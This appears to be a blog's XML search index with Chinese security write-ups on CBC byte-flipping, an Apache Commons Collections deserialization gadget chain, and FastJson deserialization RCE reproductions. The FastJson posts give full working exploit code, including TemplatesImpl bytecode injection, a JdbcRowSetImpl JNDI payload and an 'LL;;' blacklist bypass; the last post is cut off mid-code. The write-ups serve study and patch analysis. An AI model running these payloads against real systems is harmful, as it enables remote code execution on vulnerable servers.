<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CBC字节翻转攻击</title>
    <url>/2020/05/08/cbc-reverse/</url>
    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
<a id="more"></a>

<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
<p><img src="1.png" alt=""></p>
<p>文字版的加密过程：</p>
<ol>
<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
<li>将IV和第一组明文异或。</li>
<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
<li>重复4-5,直到最后一组明文。</li>
<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
</ol>
<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
<p><img src="2.png" alt=""></p>
<p>文字版的解密过程：</p>
<ol>
<li>从密文中提取出IV，然后将密文分组。</li>
<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
<li>重复3，直到最后一组密文。</li>
</ol>
<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
<p><img src="3.png" alt=""></p>
<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
<p>此攻击造成的影响:</p>
<ol>
<li>绕过过滤器</li>
<li>改变用户权限提升至管理员</li>
<li>…</li>
</ol>
<p><strong>CBC翻转攻击过程</strong></p>
<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>

<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>

<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>Apache Commons Collections分析</title>
    <url>/2020/04/20/common-collections/</url>
    <content><![CDATA[<p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。这个组件出现反序列化问题，由于很多类引起的。这里介绍其中一种方式的原理，与<font color=#008000><code>TransformedMap</code></font>和<font color=#008000><code>InvokerTransformer</code></font>有关。</p>
<a id="more"></a>



<h2 id="关键类介绍"><a href="#关键类介绍" class="headerlink" title="关键类介绍"></a>关键类介绍</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformerdMap</code>这个类是用来对Map进行某些变换用的。当一个元素被<font color=ff0000><code>添加/删除/修改</code></font>过时，会自动调用<code>tranform</code>方法自动进行特定的修饰变换，变换的逻辑由Transformer类定义。</p>
<p>通过decorate函数可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map transformedMap &#x3D; TransformedMap.decorate(map,keyTansformer,valueTransformer);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第二个参数和第三个参数分别对应于当Map中的key和value改变时需要做的操作。</p>
</blockquote>
<h3 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h3><p><code>Transformer</code>是一个接口，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，上述代码若修改了其中的任意key或value，都会调用<code>tranform</code>方法进行变换操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">	new ConstantTransformer(...);</span><br><span class="line">	new InvokerTransformer(...)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">Map transMap &#x3D; TransformedMap.decorate(rawMap,null,chainedTransformer);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若想进行一系列的变换操作，可以通过定义一个chainedTransformer来实现，只需要传入一个Transformer数组即可。</p>
</blockquote>
<p>ChainedTranformer的工作原理很简单，将上一个变换的结果作为下一次变换的输入，直到左右的变换完成，并返回最终的object。Commons Collections内置了许多常见的transformer，无需手工编写，其中InvokerTransformer可以通过调用Java反射机制来调用任意函数。</p>
<h2 id="构造chainedTransformer"><a href="#构造chainedTransformer" class="headerlink" title="构造chainedTransformer"></a>构造chainedTransformer</h2><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>相当于<code>Transformer</code>的一种。观察它的<code>tranform</code>函数，如下所示:</p>
<p>org/apache/commons/collections/functors/InvokerTransformer.class<br><img src="1.png" alt=""></p>
<p>从图上可知，关键部分在于通过<code>getClass()</code>、<code>getMethod()</code>以及<code>invoke()</code>来进行反射，查找并调用给定的方法。InvokerTransformer接受3个参数，分别是调用方法的名称，参数类型，调用参数。参数类型要对应于调用方法所指定的参数类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>内置的<code>ConstantTranformer</code>类可以获取到特定的类。<br><img src="2.png" alt=""></p>
<h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>在构造的chain中，最终的实现类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;)</span><br></pre></td></tr></table></figure>

<p>因此第一步是获取到Runtime类，通过内置的<code>ConstantTransformer</code>来获取，然后通过<code>InvokerTransformer</code>来反射调用getMethod方法，参数是getRuntime，以此来获取到<code>Runtime.getRuntime</code>。以此类推，构造出调用invoke和exec的<code>InvokerTransformer</code>，整个chain就结束了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformChain &#x3D; new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>构造完这样的一个chain之后，只需要将一个<code>Map</code>类型的数据转换为<code>TransformedMap</code>，然后对其中的key,value进行操作，即可达到反序列化命令执行。可新建一个test.java进行测试。</p>
<p>test.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">	Transformer transformedChain &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">	Map&lt;String,String&gt; beforetransMap &#x3D; new HashMap&lt;String,String&gt;();</span><br><span class="line">	beforetransMap.put(&quot;name&quot;,&quot;ananaskr&quot;);</span><br><span class="line">        </span><br><span class="line">	Map transformedMap &#x3D; TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line"></span><br><span class="line">	Map.Entry onlyElement &#x3D; (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(&quot;ananaskr1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:<br><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">Apache-Commons-Collections反序列化漏洞分析</a></li>
<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(三)</title>
    <url>/2020/05/16/fastjson-3/</url>
    <content><![CDATA[<p>上一个回顾中指出了利用<code>L</code>和<code>;</code>来进行绕过。而这次的漏洞是由于上次漏洞的补丁打得太过简单导致可以通过双写<code>LL;;</code>来绕过。这一篇文章讲述的就是这一方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson = 1.2.42</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从上次的补丁可以得知以下两点:</p>
<ul>
<li>将黑名单变成了hashcode，不好得知具体的类</li>
<li>将checkAutoType增加了对于<code>L;</code>这种情况的处理</li>
</ul>
<p>定位到checkAutoType函数。</p>
<p><img src="1.png" alt=""></p>
<p>它仅仅是判断了是否以<code>L</code>开头且以<code>;</code>结尾，如果是这样，就去掉开头的<code>L</code>和结尾的<code>;</code>。很明显可通过双写绕过。</p>
<p>比较不容易的是对于hashcode这样形式的黑名单，不容易知道真正的黑名单类。</p>
<blockquote>
<p>可通过爬取Maven仓库下所有类，然后跑一遍，输出黑名单类。</p>
</blockquote>
<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>在1.2.43版本中的补丁中对以<code>LL</code>开头且以<code>;;</code>结尾的情况进行了防御。</p>
<p><img src="3.png" alt=""></p>
<p>抛出异常，然后去除开头的<code>L</code>和结尾的<code>;</code>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(一)</title>
    <url>/2020/05/10/fastjson-1/</url>
    <content><![CDATA[<p>FastJson是一个由alibaba维护的json库，应用范围很广。2017年3月15日由官方发布最早的<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">安全公告</a>。该公告表示FastJson在1.2.24及之前版本存在远程代码执行漏洞。紧接着于4月29日出现相关POC。这篇文章就是来分析复现这一漏洞。</p>
<a id="more"></a>

<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson &lt;=1.2.24</li>
</ul>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>漏洞产生的原因是由于fastjson反序列化Json字符串为Java对象时autoType没有做正确的检测处理。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>TemplatesImpl类</li>
<li>JNDI注入-JdbcRowSetImpl类</li>
</ul>
<h1 id="利用链分析之TemplatesImpl类"><a href="#利用链分析之TemplatesImpl类" class="headerlink" title="利用链分析之TemplatesImpl类"></a>利用链分析之TemplatesImpl类</h1><h2 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h2><ul>
<li>1.2.22 &lt;= fastjson &lt;= 1.2.24</li>
</ul>
<blockquote>
<p>本来公告中表明的是FastJson在1.2.24及之前版本存在远程代码执行漏洞，但是由于此利用方式需要用到<code>Feature.SupportNonPublicField</code>属性，而该属性在1.2.22版本之后才开始提供相应的支持。</p>
</blockquote>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>该反序列化漏洞利用链之前分析过的CommonsBeanUtils1中的后半部分payload，即利用TemplatesImpl类的<font color=#008000><code>getOutputProperties()</code></font>函数，调用到newTransformer()，从而RCE。之前利用commons-beanutils中的BeanComparator.compare()方法调用到getOutputProperties()的方法显然是行不通的。那么在这里，我们要解决的问题就是如何调用getOutputProperties()。</p>
<p>如果了解FastJson的反序列化，那么就很容易知道通过TemplatesImpl类成员变量<font color=#008000><code>_outputProperties</code></font>来自动调用<font color=#008000><code>getOutputProperties()</code></font>。如果不了解其反序列化，可以看这篇<a href="">文章</a>。</p>
<p>而在后续的过程中会用到_bytecodes中存放的恶意代码，因此_bytecodes必须是能够被反序列化的。来看看_bytecodes在TemplatesImpl中的情况。</p>
<p><img src="1.png" alt=""></p>
<p><img src="2.png" alt=""></p>
<p>它是一个私有属性，按理来说，它有一个setter方法，不知道是不是由于setter是个私有方法，所以不能被序列化。在这里要想_bytecodes被反序列化，需要设定parseObject()函数的参数<code>Feature.SupportNonPublicField</code>。  </p>
<p>接下来需要满足的条件就是需要能够调用到getOutputProperties()。这个getter方法正好满足p0’s师傅文章中所写的条件。FastJson会对满足下列要求的getter进行调用。</p>
<ul>
<li>只有getter没有setter</li>
<li>函数名称大于4</li>
<li>非静态函数</li>
<li>函数名称以get起始，且第四个字符为大写字母</li>
<li>函数没有入参</li>
<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
</ul>
<p>来看看getOutputProperties()的情况。</p>
<p><img src="3.png" alt=""></p>
<p>它是一个Properties类，它继承自Hashtable，Hashtable又继承自Map。因此满足条件。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>首先可以通过前面Javassist的方式生成恶意的字节码。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//in main()</span></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后获取TemplatesImpl.class，构造出序列化JSON数据，如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br></pre></td></tr></table></figure>

<p>在实际利用时，不能直接将获取的字节码转换为字符串进行拼接，而是需要经过一个base64编码变成字符串进行拼接。这个问题会在后面的细节问题中作出解释。</p>
<p>完整的demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span 